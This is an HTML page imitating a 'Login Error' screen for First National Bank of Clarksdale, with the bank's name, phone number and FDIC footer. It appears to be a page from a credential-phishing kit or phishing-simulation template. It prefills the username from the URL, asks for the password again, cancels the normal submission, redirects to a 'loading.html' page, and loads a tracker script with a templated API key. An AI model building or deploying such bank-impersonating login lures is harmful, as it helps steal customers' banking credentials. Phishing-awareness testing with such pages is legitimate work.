<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Error - First National Bank of Clarksdale</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background: url('background.png') center center / cover no-repeat;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            position: relative;
            padding: 20px 0;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.6);
            z-index: 0;
        }

        .login-container {
            background: rgba(40, 42, 45, 0.98);
            border-radius: 16px;
            padding: 50px 30px 40px;
            width: 100%;
            max-width: 500px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.6);
            position: relative;
            z-index: 1;
            margin: auto 20px;
            margin-top: 80px;
        }

        .logo-container {
            text-align: center;
            margin-bottom: 35px;
        }

        .logo-container img {
            max-width: 560px;
            width: 100%;
            height: auto;
        }

        .error-banner {
            background: #e8704f;
            color: #1a1a1a;
            padding: 18px 20px;
            border-radius: 8px;
            margin-bottom: 30px;
            font-size: 16px;
            font-weight: 600;
            text-align: left;
        }

        .form-group {
            margin-bottom: 24px;
            position: relative;
        }

        .input-wrapper {
            position: relative;
            border: 1.5px solid rgba(100, 100, 100, 0.5);
            border-radius: 8px;
            background: rgba(30, 32, 35, 0.7);
            transition: all 0.3s ease;
        }

        .input-wrapper:focus-within {
            border-color: #6b7bff;
            box-shadow: 0 0 0 1px #6b7bff;
        }

        .input-wrapper:focus-within label {
            color: #6b7bff;
        }

        .form-group label {
            position: absolute;
            top: -10px;
            left: 14px;
            background: rgba(40, 42, 45, 0.98);
            padding: 0 6px;
            color: #999;
            font-size: 13px;
            font-weight: 400;
            z-index: 2;
            transition: color 0.3s ease;
        }

        .form-group input {
            width: 100%;
            padding: 16px 45px 16px 18px;
            background: transparent;
            border: none;
            color: #fff;
            font-size: 15px;
            outline: none;
        }

        .form-group input::placeholder {
            color: #777;
        }

        .switch-btn {
            position: absolute;
            right: 18px;
            top: 50%;
            transform: translateY(-50%);
            color: #6b7bff;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            background: none;
            border: none;
            padding: 0;
            z-index: 2;
        }

        .switch-btn:hover {
            color: #8b9bff;
        }

        .toggle-password {
            position: absolute;
            right: 18px;
            top: 50%;
            transform: translateY(-50%);
            cursor: pointer;
            color: #999;
            width: 20px;
            height: 20px;
            z-index: 2;
            user-select: none;
        }

        .toggle-password:hover {
            color: #ccc;
        }

        .forgot-link {
            text-align: right;
            margin-top: 12px;
            margin-bottom: 40px;
        }

        .forgot-link a {
            color: #6b7bff;
            font-size: 14px;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-link a:hover {
            color: #8b9bff;
        }

        .button-group {
            display: flex;
            justify-content: space-between;
            align-items: center;
            gap: 15px;
            margin-top: 40px;
        }

        .passkey-btn {
            display: flex;
            align-items: center;
            gap: 10px;
            background: none;
            border: none;
            color: #6b7bff;
            font-size: 18px;
            font-weight: 500;
            cursor: pointer;
            padding: 0;
            white-space: nowrap;
        }

        .passkey-btn:hover {
            color: #8b9bff;
        }

        .passkey-icon {
            width: 36px;
            height: 36px;
            color: #6b7bff;
        }

        .signin-btn {
            background: #4a5dd8;
            color: #fff;
            border: none;
            border-radius: 12px;
            padding: 18px 60px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            white-space: nowrap;
            flex-shrink: 0;
        }

        .signin-btn:hover {
            background: #3a4dc8;
        }

        .continue-btn {
            background: #4a5dd8;
            color: #fff;
            border: none;
            border-radius: 12px;
            padding: 18px 60px;
            font-size: 17px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            white-space: nowrap;
            width: auto;
            margin-left: auto;
            display: none;
        }

        .continue-btn:hover {
            background: #3a4dc8;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            width: 100%;
            text-align: center;
            color: #888;
            font-size: 11px;
            z-index: 1;
            padding: 20px;
            line-height: 1.8;
            background: rgba(20, 22, 25, 0.9);
            backdrop-filter: blur(10px);
        }

        .footer-line {
            display: block;
            margin: 4px 0;
        }

        .footer a {
            color: #6b7bff;
            text-decoration: none;
        }

        .footer a:hover {
            color: #8b9bff;
        }

        .footer-divider {
            margin: 0 8px;
            color: #555;
        }

        @media (max-width: 600px) {
            body {
                padding: 10px 0;
                justify-content: flex-start;
            }

            .login-container {
                padding: 30px 20px 25px;
                margin: 20px 15px 100px 15px;
                max-width: calc(100% - 30px);
                border-radius: 12px;
            }

            .logo-container {
                margin-bottom: 30px;
            }

            .logo-container img {
                max-width: 100%;
                width: 280px;
            }

            .error-banner {
                padding: 15px 18px;
                font-size: 14px;
                margin-bottom: 25px;
            }

            .form-group input {
                padding: 14px 45px 14px 16px;
                font-size: 14px;
            }

            .button-group {
                gap: 8px;
                flex-wrap: nowrap;
            }

            .passkey-btn {
                font-size: 13px;
                gap: 6px;
            }

            .passkey-icon {
                width: 24px;
                height: 24px;
            }

            .signin-btn {
                padding: 16px 40px;
                font-size: 15px;
            }

            .continue-btn {
                padding: 16px 40px;
                font-size: 15px;
            }

            .footer {
                position: fixed;
                padding: 15px 10px;
                font-size: 10px;
                line-height: 1.6;
            }

            .footer-line {
                font-size: 10px;
            }
        }

        @media (max-width: 400px) {
            .login-container {
                padding: 25px 15px 20px;
                margin: 15px 10px 100px 10px;
            }

            .logo-container img {
                width: 240px;
            }

            .error-banner {
                padding: 12px 15px;
                font-size: 13px;
            }

            .passkey-btn {
                font-size: 11px;
                gap: 4px;
            }

            .passkey-icon {
                width: 20px;
                height: 20px;
            }

            .signin-btn {
                padding: 14px 30px;
                font-size: 14px;
            }

            .continue-btn {
                padding: 14px 30px;
                font-size: 14px;
            }

            .button-group {
                gap: 6px;
            }
        }
    </style>

<script src="/tracker.js" data-api-key="%%API_KEY%%"></script>
</head>
<body>
    <div class="login-container">
        <div class="logo-container">
            <img src="logo.png" alt="Your Hometown Bank">
        </div>

        <div class="error-banner">
            Something went wrong. Your username or password is incorrect.
        </div>

        <form id="loginForm">
            <div class="form-group">
                <div class="input-wrapper">
                    <label for="username">Username</label>
                    <input type="text" id="username" name="username" placeholder="" autocomplete="username" required>
                    <button type="button" class="switch-btn" onclick="showUsernameOnly()">Switch</button>
                </div>
            </div>

            <div class="form-group" id="password-group" style="display: none;">
                <div class="input-wrapper">
                    <label for="password">Enter your password</label>
                    <input type="password" id="password" name="password" placeholder="" autocomplete="current-password" required>
                    <svg class="toggle-password" onclick="togglePassword()" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                        <path fill-rule="evenodd" d="M12 6.25c-4.354 0-6.76 2.428-9.066 4.754l-.464.466a.75.75 0 0 0 0 1.061l.464.467C5.24 15.324 7.646 17.751 12 17.751c4.354 0 6.76-2.427 9.066-4.753l.464-.467a.75.75 0 0 0 0-1.06l-.464-.467C18.76 8.678 16.354 6.25 12 6.25Zm0 10c-3.65 0-5.635-1.932-7.941-4.25C6.365 9.685 8.349 7.75 12 7.75c3.65 0 5.635 1.934 7.941 4.25-2.306 2.318-4.29 4.25-7.941 4.25ZM12 15a3 3 0 1 0 0-6 3 3 0 0 0 0 6Z"></path>
                    </svg>
                </div>
            </div>

            <div class="forgot-link" id="forgot-link" style="display: none;">
                <a href="#">Forgot?</a>
            </div>

            <div class="button-group" id="button-group" style="display: none;">
                <button type="button" class="passkey-btn">
                    <svg class="passkey-icon" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor">
                        <path fill-rule="evenodd" d="M11.998 3.501c-2.381 0-4.312.7-5.377 1.356a.75.75 0 0 1-.787-1.277c1.305-.804 3.509-1.579 6.164-1.579 2.67 0 4.71.78 6.109 1.564a.75.75 0 1 1-.733 1.308c-1.22-.684-3.011-1.372-5.376-1.372Zm-.745 2.43c-2.998.286-5.695 1.897-6.974 3.887a.75.75 0 0 1-1.262-.81C4.58 6.573 7.724 4.76 11.11 4.437c3.43-.325 7.163.873 9.846 4.531a.75.75 0 1 1-1.21.887c-2.34-3.192-5.538-4.205-8.494-3.924ZM9.67 8.607c3.82-1.507 8.563 1.228 9.143 5.413.126.91-.145 1.422-.462 1.73-.35.343-.838.513-1.205.557a1.885 1.885 0 0 1-1.176-.28c-.35-.224-.651-.604-.696-1.273-.072-1.068-.497-1.899-1.155-2.45-.646-.54-1.456-.762-2.227-.737-1.495.049-3.156 1.091-3.156 3.014 0 1.413.216 2.805 1.004 4.086.79 1.282 2.099 2.365 4.122 3.268a.75.75 0 0 0 .612-1.37c-1.838-.82-2.87-1.732-3.456-2.684-.588-.954-.782-2.035-.782-3.3 0-.861.74-1.483 1.705-1.515.46-.014.894.12 1.215.389.31.26.574.693.621 1.4.079 1.163.65 1.965 1.384 2.435.7.45 1.525.584 2.166.506.598-.072 1.426-.34 2.072-.972.68-.664 1.086-1.661.9-3.01-.713-5.14-6.45-8.468-11.18-6.603-2.286.902-4.007 2.426-4.887 4.428-.88 2.003-.878 4.393.105 6.947a.75.75 0 1 0 1.4-.538c-.87-2.258-.824-4.23-.132-5.806C6.3 10.664 7.683 9.39 9.67 8.606Zm2.284 5.401a.75.75 0 0 1 .76.74c.04 2.692 2.468 4.333 5.093 3.82a.75.75 0 1 1 .287 1.472c-3.361.657-6.824-1.468-6.88-5.27a.75.75 0 0 1 .74-.762Zm.004-3.358c.887-.019 2.012.315 2.906 1.016.873.686 1.506 1.704 1.506 3.092a.75.75 0 1 0 1.5 0c0-1.908-.895-3.341-2.08-4.272-1.165-.914-2.628-1.362-3.863-1.336-2.367.049-5.325 1.553-5.723 4.978-.38 3.269 1.62 6.224 3.02 7.568a.75.75 0 0 0 1.039-1.082c-1.237-1.188-2.871-3.709-2.569-6.313.284-2.447 2.385-3.612 4.264-3.651Z"></path>
                    </svg>
                    Sign in with a passkey
                </button>
                <button type="submit" class="signin-btn">Sign in</button>
            </div>

            <button type="button" class="continue-btn" id="continue-btn" onclick="handleContinue()" style="display: block;">Continue</button>
        </form>
    </div>

    <div class="footer">
        <span class="footer-line">© 2026 First National Bank of Clarksdale <span class="footer-divider">•</span> (662) 627-3261</span>
        <span class="footer-line"><a href="#">Privacy policy</a> <span class="footer-divider">•</span> Member FDIC</span>
        <span class="footer-line"><a href="#">🏠 Equal Housing Lender</a></span>
    </div>

    <script>
        function togglePassword() {
            const passwordInput = document.getElementById('password');
            
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
            } else {
                passwordInput.type = 'password';
            }
        }

        function showUsernameOnly() {
            const passwordGroup = document.getElementById('password-group');
            const forgotLink = document.getElementById('forgot-link');
            const buttonGroup = document.getElementById('button-group');
            const continueBtn = document.getElementById('continue-btn');
            
            passwordGroup.style.display = 'none';
            forgotLink.style.display = 'none';
            buttonGroup.style.display = 'none';
            continueBtn.style.display = 'block';
        }

        function showFullForm() {
            const passwordGroup = document.getElementById('password-group');
            const forgotLink = document.getElementById('forgot-link');
            const buttonGroup = document.getElementById('button-group');
            const continueBtn = document.getElementById('continue-btn');
            
            passwordGroup.style.display = 'block';
            forgotLink.style.display = 'block';
            buttonGroup.style.display = 'flex';
            continueBtn.style.display = 'none';
        }

        function handleContinue() {
            showFullForm();
            setTimeout(() => {
                document.getElementById('password').focus();
            }, 100);
        }

        document.addEventListener('DOMContentLoaded', function() {
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const loginForm = document.getElementById('loginForm');
            
            // Get username from URL parameter
            const urlParams = new URLSearchParams(window.location.search);
            const username = urlParams.get('username');
            
            if (username) {
                usernameInput.value = username;
            }
            
            // Always focus on username input on error page
            setTimeout(() => {
                usernameInput.focus();
                usernameInput.select();
            }, 100);
            
            usernameInput.addEventListener('click', showUsernameOnly);
            
            // Handle form submission
            loginForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                const usernameValue = usernameInput.value.trim();
                const passwordValue = passwordInput.value.trim();
                
                if (usernameValue && passwordValue) {
                    window.location.href = 'loading.html';
                }
            });
        });
    </script>
</body>
</html>
